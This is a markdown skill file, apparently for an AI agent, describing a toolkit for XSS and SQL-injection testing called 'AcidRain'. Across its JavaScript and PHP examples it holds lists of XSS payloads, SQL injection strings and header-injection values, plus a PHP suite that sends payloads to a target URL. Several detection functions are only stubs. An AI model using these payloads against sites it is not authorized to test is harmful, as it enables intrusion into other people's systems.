```markdown
---
name: acidrain-xss-security-testing
description: Use AcidRain's XSS analysis resources, JavaScript utilities, and PHP injection testing samples for authorized security research and learning
triggers:
  - test for XSS vulnerabilities with AcidRain
  - use AcidRain security scripts for injection testing
  - analyze cross-site scripting with AcidRain
  - run AcidRain XSS payloads in testing environment
  - implement AcidRain JavaScript security utilities
  - use AcidRain PHP injection examples
  - explore web security testing with AcidRain
  - set up AcidRain for authorized penetration testing
---

# AcidRain XSS Security Testing Skill

> Skill by [ara.so](https://ara.so) — Security Skills collection.

AcidRain is a 2026 web-oriented collection of XSS analysis resources, JavaScript utilities, PHP examples, and injection testing samples for authorized security testing and hands-on learning. This skill helps you navigate and use AcidRain's scripts for legitimate security research on systems you own or have explicit permission to test.

## Installation

Clone the repository and navigate to the project directory:

```bash
git clone https://github.com/henry-lewiskpp1107/acidrain-security-script-hub.git
cd acidrain-security-script-hub
```

The project structure typically includes:

```text
acidrain-security-script-hub/
├── scripts/
│   ├── javascript/    # Client-side XSS utilities
│   ├── php/          # Server-side testing scripts
│   └── xss/          # XSS payload collections
├── configs/          # Configuration files
├── examples/         # Usage examples
├── docs/            # Documentation
└── README.md
```

## Core Components

### 1. JavaScript Utilities

AcidRain's JavaScript utilities are designed for browser-based security testing. Use them in controlled environments with proper authorization.

**Basic XSS Payload Testing:**

```javascript
// Example: DOM-based XSS detection script
// Save as test-dom-xss.js in scripts/javascript/

(function() {
    'use strict';
    
    // Test for DOM XSS vulnerabilities
    function testDOMXSS() {
        const testPayload = '<img src=x onerror=alert("XSS")>';
        const vulnerableElements = [];
        
        // Check common injection points
        const inputs = document.querySelectorAll('input, textarea');
        inputs.forEach(input => {
            if (!input.hasAttribute('data-sanitized')) {
                vulnerableElements.push({
                    element: input.tagName,
                    id: input.id || 'no-id',
                    name: input.name || 'no-name'
                });
            }
        });
        
        console.log('Potentially vulnerable elements:', vulnerableElements);
        return vulnerableElements;
    }
    
    // Execute test
    window.acidRainTest = testDOMXSS;
})();
```

**Cookie Extraction Utility:**

```javascript
// Example: Cookie security analyzer
// scripts/javascript/cookie-analyzer.js

const AcidRainCookieAnalyzer = {
    analyze: function() {
        const cookies = document.cookie.split(';');
        const analysis = [];
        
        cookies.forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            analysis.push({
                name: name,
                hasHttpOnly: this.checkHttpOnly(name),
                hasSecure: this.checkSecure(name),
                accessible: true
            });
        });
        
        return analysis;
    },
    
    checkHttpOnly: function(cookieName) {
        // HttpOnly cookies won't be accessible via JavaScript
        // This is a limitation indicator, not a bypass
        return false; // Always false if accessible
    },
    
    checkSecure: function(cookieName) {
        return window.location.protocol === 'https:';
    },
    
    report: function() {
        const results = this.analyze();
        console.table(results);
        return results;
    }
};

// Usage: AcidRainCookieAnalyzer.report()
```

### 2. PHP Server-Side Testing

PHP scripts in AcidRain help test server-side input validation and output encoding.

**Basic Input Reflection Test:**

```php
<?php
// Example: Input reflection vulnerability scanner
// scripts/php/reflection-test.php

class AcidRainReflectionTest {
    private $testPayloads = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        "';alert(String.fromCharCode(88,83,83))//",
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")'
    ];
    
    public function testParameter($input) {
        $results = [];
        
        foreach ($this->testPayloads as $payload) {
            $reflected = $this->simulateReflection($input, $payload);
            $results[] = [
                'payload' => $payload,
                'reflected' => $reflected,
                'vulnerable' => $this->isVulnerable($reflected, $payload)
            ];
        }
        
        return $results;
    }
    
    private function simulateReflection($input, $payload) {
        // Simulate how application might reflect input
        return str_replace('{{input}}', $payload, $input);
    }
    
    private function isVulnerable($output, $payload) {
        // Check if payload is reflected unescaped
        return strpos($output, $payload) !== false;
    }
    
    public function generateReport($results) {
        echo "=== AcidRain Reflection Test Report ===\n\n";
        foreach ($results as $result) {
            echo "Payload: {$result['payload']}\n";
            echo "Status: " . ($result['vulnerable'] ? "VULNERABLE" : "SAFE") . "\n";
            echo "---\n";
        }
    }
}

// Usage
$tester = new AcidRainReflectionTest();
$results = $tester->testParameter('<div>{{input}}</div>');
$tester->generateReport($results);
?>
```

**SQL Injection Detection Helper:**

```php
<?php
// scripts/php/sql-injection-detector.php

class AcidRainSQLInjectionDetector {
    private $testStrings = [
        "' OR '1'='1",
        "1' UNION SELECT NULL--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "admin'--",
        "' OR 1=1--"
    ];
    
    public function testInput($paramName, $value) {
        $findings = [];
        
        foreach ($this->testStrings as $testString) {
            $testValue = $value . $testString;
            
            $finding = [
                'parameter' => $paramName,
                'test_string' => $testString,
                'test_value' => $testValue,
                'timestamp' => date('Y-m-d H:i:s')
            ];
            
            // Log for manual review
            $findings[] = $finding;
        }
        
        return $findings;
    }
    
    public function logFindings($findings, $logFile = 'acidrain_sqli.log') {
        $logPath = getenv('ACIDRAIN_LOG_PATH') ?: './logs/';
        $fullPath = $logPath . $logFile;
        
        $logEntry = json_encode($findings, JSON_PRETTY_PRINT) . "\n";
        file_put_contents($fullPath, $logEntry, FILE_APPEND);
        
        return $fullPath;
    }
}

// Usage
$detector = new AcidRainSQLInjectionDetector();
$findings = $detector->testInput('username', 'testuser');
$logPath = $detector->logFindings($findings);
echo "Findings logged to: {$logPath}\n";
?>
```

### 3. XSS Payload Collections

AcidRain organizes XSS payloads for different contexts.

**Payload Manager:**

```javascript
// scripts/xss/payload-manager.js

const AcidRainPayloadManager = {
    payloads: {
        basic: [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>'
        ],
        encoded: [
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
            '&#60;script&#62;alert(1)&#60;/script&#62;'
        ],
        advanced: [
            '<iframe src="javascript:alert(1)">',
            '<object data="javascript:alert(1)">',
            '<embed src="data:text/html,<script>alert(1)</script>">'
        ],
        context_breaking: [
            '"><script>alert(1)</script>',
            '\';alert(1);//',
            '`${alert(1)}`'
        ]
    },
    
    getPayloads: function(category = 'basic') {
        return this.payloads[category] || [];
    },
    
    getAllPayloads: function() {
        return Object.values(this.payloads).flat();
    },
    
    testPayload: function(payload, context = 'html') {
        const testResults = {
            payload: payload,
            context: context,
            encoded: this.encodePayload(payload, context),
            timestamp: new Date().toISOString()
        };
        
        console.log('Testing payload:', testResults);
        return testResults;
    },
    
    encodePayload: function(payload, context) {
        switch(context) {
            case 'html':
                return payload.replace(/</g, '&lt;').replace(/>/g, '&gt;');
            case 'url':
                return encodeURIComponent(payload);
            case 'js':
                return JSON.stringify(payload);
            default:
                return payload;
        }
    }
};

// Export for Node.js or browser
if (typeof module !== 'undefined' && module.exports) {
    module.exports = AcidRainPayloadManager;
}
```

## Configuration

Create a configuration file for AcidRain testing sessions:

```javascript
// configs/acidrain-config.js

const AcidRainConfig = {
    // Environment settings
    environment: process.env.ACIDRAIN_ENV || 'development',
    
    // Target configuration
    target: {
        baseUrl: process.env.TARGET_BASE_URL || 'http://localhost:8080',
        allowedHosts: (process.env.ALLOWED_HOSTS || 'localhost').split(','),
        timeout: parseInt(process.env.REQUEST_TIMEOUT) || 5000
    },
    
    // Logging configuration
    logging: {
        enabled: process.env.ACIDRAIN_LOGGING === 'true',
        logPath: process.env.ACIDRAIN_LOG_PATH || './logs/',
        level: process.env.LOG_LEVEL || 'info'
    },
    
    // Testing parameters
    testing: {
        maxPayloads: parseInt(process.env.MAX_PAYLOADS) || 50,
        delayBetweenRequests: parseInt(process.env.REQUEST_DELAY) || 1000,
        userAgent: process.env.USER_AGENT || 'AcidRain-SecurityTester/2026'
    },
    
    // Safety settings
    safety: {
        requireAuthorization: process.env.REQUIRE_AUTH !== 'false',
        confirmBeforeTest: process.env.CONFIRM_TESTS === 'true',
        dryRun: process.env.DRY_RUN === 'true'
    }
};

module.exports = AcidRainConfig;
```

PHP configuration:

```php
<?php
// configs/acidrain-config.php

return [
    'environment' => getenv('ACIDRAIN_ENV') ?: 'development',
    
    'target' => [
        'base_url' => getenv('TARGET_BASE_URL') ?: 'http://localhost:8080',
        'allowed_hosts' => explode(',', getenv('ALLOWED_HOSTS') ?: 'localhost'),
        'timeout' => (int)(getenv('REQUEST_TIMEOUT') ?: 5)
    ],
    
    'logging' => [
        'enabled' => getenv('ACIDRAIN_LOGGING') === 'true',
        'log_path' => getenv('ACIDRAIN_LOG_PATH') ?: './logs/',
        'level' => getenv('LOG_LEVEL') ?: 'info'
    ],
    
    'database' => [
        'host' => getenv('DB_HOST'),
        'name' => getenv('DB_NAME'),
        'user' => getenv('DB_USER'),
        'pass' => getenv('DB_PASS')
    ],
    
    'safety' => [
        'require_authorization' => getenv('REQUIRE_AUTH') !== 'false',
        'confirm_before_test' => getenv('CONFIRM_TESTS') === 'true',
        'dry_run' => getenv('DRY_RUN') === 'true'
    ]
];
?>
```

## Common Usage Patterns

### Pattern 1: XSS Vulnerability Assessment

```javascript
// Complete XSS assessment workflow

const AcidRainAssessment = {
    init: function(targetUrl) {
        this.target = targetUrl;
        this.results = [];
    },
    
    runAssessment: async function() {
        console.log(`Starting AcidRain assessment on ${this.target}`);
        
        // Step 1: Identify injection points
        const injectionPoints = this.findInjectionPoints();
        console.log(`Found ${injectionPoints.length} potential injection points`);
        
        // Step 2: Test each point
        for (const point of injectionPoints) {
            const result = await this.testInjectionPoint(point);
            this.results.push(result);
        }
        
        // Step 3: Generate report
        return this.generateReport();
    },
    
    findInjectionPoints: function() {
        const points = [];
        
        // Find all input fields
        document.querySelectorAll('input, textarea, select').forEach(el => {
            points.push({
                type: 'input',
                element: el.tagName,
                name: el.name,
                id: el.id
            });
        });
        
        // Find URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        urlParams.forEach((value, key) => {
            points.push({
                type: 'url_parameter',
                name: key,
                value: value
            });
        });
        
        return points;
    },
    
    testInjectionPoint: async function(point) {
        const payloads = AcidRainPayloadManager.getPayloads('basic');
        const testResults = [];
        
        for (const payload of payloads) {
            const result = {
                point: point,
                payload: payload,
                reflected: this.checkReflection(payload),
                executed: this.checkExecution(payload),
                timestamp: Date.now()
            };
            testResults.push(result);
        }
        
        return {
            injectionPoint: point,
            tests: testResults
        };
    },
    
    checkReflection: function(payload) {
        return document.body.innerHTML.includes(payload);
    },
    
    checkExecution: function(payload) {
        // In a real test, implement proper execution detection
        return false; // Placeholder
    },
    
    generateReport: function() {
        return {
            target: this.target,
            timestamp: new Date().toISOString(),
            totalTests: this.results.length,
            results: this.results,
            summary: this.summarizeResults()
        };
    },
    
    summarizeResults: function() {
        const summary = {
            vulnerable: 0,
            safe: 0,
            uncertain: 0
        };
        
        this.results.forEach(result => {
            const hasVulnerability = result.tests.some(t => t.reflected || t.executed);
            if (hasVulnerability) {
                summary.vulnerable++;
            } else {
                summary.safe++;
            }
        });
        
        return summary;
    }
};

// Usage
// AcidRainAssessment.init('https://example.com');
// const report = await AcidRainAssessment.runAssessment();
// console.log(report);
```

### Pattern 2: PHP Server-Side Testing

```php
<?php
// Complete server-side security test suite

class AcidRainTestSuite {
    private $config;
    private $results = [];
    
    public function __construct($configPath = './configs/acidrain-config.php') {
        $this->config = require $configPath;
    }
    
    public function runFullSuite($targetUrl) {
        echo "=== AcidRain Security Test Suite ===\n";
        echo "Target: {$targetUrl}\n\n";
        
        // Authorization check
        if ($this->config['safety']['require_authorization']) {
            if (!$this->confirmAuthorization()) {
                die("Authorization not confirmed. Exiting.\n");
            }
        }
        
        // Run tests
        $this->results['xss'] = $this->testXSS($targetUrl);
        $this->results['sqli'] = $this->testSQLInjection($targetUrl);
        $this->results['header'] = $this->testHeaderInjection($targetUrl);
        
        // Generate report
        return $this->generateReport();
    }
    
    private function confirmAuthorization() {
        echo "Do you have authorization to test this target? (yes/no): ";
        $handle = fopen("php://stdin", "r");
        $line = trim(fgets($handle));
        fclose($handle);
        return strtolower($line) === 'yes';
    }
    
    private function testXSS($url) {
        $payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>'
        ];
        
        $results = [];
        foreach ($payloads as $payload) {
            $testResult = $this->makeRequest($url, ['test' => $payload]);
            $results[] = [
                'payload' => $payload,
                'reflected' => strpos($testResult, $payload) !== false,
                'response_length' => strlen($testResult)
            ];
        }
        
        return $results;
    }
    
    private function testSQLInjection($url) {
        $detector = new AcidRainSQLInjectionDetector();
        return $detector->testInput('id', '1');
    }
    
    private function testHeaderInjection($url) {
        $headers = [
            'User-Agent' => 'AcidRain<script>alert(1)</script>',
            'Referer' => 'javascript:alert(1)',
            'X-Forwarded-For' => '127.0.0.1<script>alert(1)</script>'
        ];
        
        $results = [];
        foreach ($headers as $header => $value) {
            $results[$header] = [
                'tested' => true,
                'payload' => $value
            ];
        }
        
        return $results;
    }
    
    private function makeRequest($url, $params = []) {
        if ($this->config['safety']['dry_run']) {
            return "DRY RUN - No actual request made";
        }
        
        $queryString = http_build_query($params);
        $fullUrl = $url . '?' . $queryString;
        
        $context = stream_context_create([
            'http' => [
                'timeout' => $this->config['target']['timeout'],
                'user_agent' => $this->config['testing']['userAgent']
            ]
        ]);
        
        return @file_get_contents($fullUrl, false, $context) ?: '';
    }
    
    private function generateReport() {
        $report = [
            'timestamp' => date('Y-m-d H:i:s'),
            'environment' => $this->config['environment'],
            'results' => $this->results
        ];
        
        if ($this->config['logging']['enabled']) {
            $this->saveReport($report);
        }
        
        return $report;
    }
    
    private function saveReport($report) {
        $logPath = $this->config['logging']['log_path'];
        $filename = $logPath . 'acidrain_report_' . time() . '.json';
        
        if (!is_dir($logPath)) {
            mkdir($logPath, 0755, true);
        }
        
        file_put_contents($filename, json_encode($report, JSON_PRETTY_PRINT));
        echo "\nReport saved to: {$filename}\n";
    }
}

// Usage
// $suite = new AcidRainTestSuite();
// $report = $suite->runFullSuite('http://localhost:8080/test');
// print_r($report);
?>
```

### Pattern 3: Automated Payload Rotation

```javascript
// Automated testing with payload rotation

class AcidRainAutomatedTester {
    constructor(config) {
        this.config = config;
        this.payloadQueue = [];
        this.results = [];
    }
    
    async runAutomatedTest(target, injectionPoints) {
        console.log('Starting automated AcidRain testing...');
        
        // Build payload queue
        this.buildPayloadQueue(injectionPoints);
        
        // Execute tests with delays
        for (const test of this.payloadQueue) {
            await this.executeTest(test);
            await this.delay(this.config.testing.delayBetweenRequests);
        }
        
        return this.compileResults();
    }
    
    buildPayloadQueue(injectionPoints) {
        const allPayloads = AcidRainPayloadManager.getAllPayloads();
        
        injectionPoints.forEach(point => {
            allPayloads.forEach(payload => {
                this.payloadQueue.push({
                    point: point,
                    payload: payload,
                    status: 'pending'
                });
            });
        });
        
        console.log(`Queue built: ${this.payloadQueue.length} tests`);
    }
    
    async executeTest(test) {
        try {
            const startTime = Date.now();
            
            // Simulate test execution
            const result = await this.testPayload(test.point, test.payload);
            
            this.results.push({
                ...test,
                status: 'completed',
                result: result,
                duration: Date.now() - startTime
            });
            
            console.log(`✓ Tested: ${test.payload.substring(0, 30)}...`);
        } catch (error) {
            this.results.push({
                ...test,
                status: 'error',
                error: error.message
            });
            
            console.error(`✗ Error testing: ${test.payload.substring(0, 30)}...`);
        }
    }
    
    async testPayload(point, payload) {
        // Implementation depends on testing method
        return {
            vulnerable: false,
            reflected: false,
            details: 'Test completed'
        };
    }
    
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    compileResults() {
        const summary = {
            total: this.results.length,
            completed: this.results.filter(r => r.status === 'completed').length,
            errors: this.results.filter(r => r.status === 'error').length,
            vulnerable: this.results.filter(r => r.result?.vulnerable).length,
            timestamp: new Date().toISOString(),
            results: this.results
        };
        
        return summary;
    }
}

// Usage
// const config = require('./configs/acidrain-config.js');
// const tester = new AcidRainAutomatedTester(config);
// const injectionPoints = [{type: 'input', name: 'search'}];
// const results = await tester.runAutomatedTest('http://localhost:8080', injectionPoints);
```

## Troubleshooting

### Common Issues

**Issue: Scripts not executing in browser**

Check Content Security Policy (CSP) headers. AcidRain scripts may be blocked:

```javascript
// Check CSP
console.log(document.querySelector('meta[http-equiv="Content-Security-Policy"]'));

// Alternative: Use browser console
fetch(location.href)
    .then(r => r.headers.get('content-security-policy'))
    .then(csp => console.log('CSP:', csp));
```

**Issue: PHP scripts timing out**

Adjust timeout settings in configuration:

```php
<?php
// Increase execution time for testing
set_time_limit(300); // 5 minutes
ini_set('max_execution_time', 300);

// Use in scripts/php/
?>
```

**Issue: Payloads not reflecting**

Check encoding and context:

```javascript
// Debug payload reflection
function debugReflection(payload) {
    console.log('Original:', payload);
    console.log('HTML encoded:', payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
    console.log('URL encoded:', encodeURIComponent(payload));
    console.log('Found in page:', document.body.innerHTML.includes(payload));
}
```

**Issue: Permission denied errors**

Ensure proper authorization and file permissions:

```bash
# Fix log directory permissions
mkdir -p ./logs
chmod 755 ./logs

# Set environment variables
export ACIDRAIN_ENV=testing
export REQUIRE_AUTH=true
export TARGET_BASE_URL=http://localhost:8080
```

**Issue: False positives in testing**

Implement verification checks:

```javascript
function verifyVulnerability(payload, context) {
    // Check if payload actually executed vs just reflected
    const reflected = document.body.innerHTML.includes(payload);
    const executed = window.acidRainExecutionFlag === true;
    
    return {
        reflected: reflected,
        executed: executed,
        vulnerability_confirmed: reflected && executed
    };
}
```

## Best Practices

1. **Always get authorization** before testing any system
2. **Use isolated environments** for learning and development
3. **Log all testing activity** for audit purposes
4. **Respect rate limits** and implement delays between requests
5. **Validate environment variables** before running tests
6. **Keep payloads updated** with latest security research
7. **Review results manually** - automated tools can have false positives
8. **Document findings** thoroughly for remediation teams

## Environment Setup Example

```bash
# .env file for AcidRain testing
ACIDRAIN_ENV=testing
TARGET_BASE_URL=http://localhost:8080
ALLOWED_HOSTS=localhost,127.0.0.1
REQUEST_TIMEOUT=5000
ACIDRAIN_LOGGING=true
ACIDRAIN_LOG_PATH=./logs/
LOG_LEVEL=info
MAX_PAYLOADS=50
REQUEST_DELAY=1000
USER_AGENT=AcidRain-SecurityTester/2026
REQUIRE_AUTH=true
CONFIRM_TESTS=true
DRY_RUN=false

# Database for testing (if needed)
DB_HOST=localhost
DB_NAME=test_db
DB_USER=test_user
DB_PASS=test_password
```

Load environment variables in your scripts:

```javascript
// Node.js
require('dotenv').config();
const config = require('./configs/acidrain-config.js');
```

```php
<?php
// PHP
// Use vlucas/phpdotenv or similar
$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();
?>
```

## Legal and Ethical Notice

AcidRain is intended for authorized security testing only. Always:

- Obtain written permission before testing
- Test only systems you own or have explicit authorization to test
- Use responsibly in educational and research contexts
- Comply with local laws and regulations
- Report vulnerabilities responsibly through proper channels

Unauthorized access to computer systems is illegal. Use AcidRain ethically and legally.
```
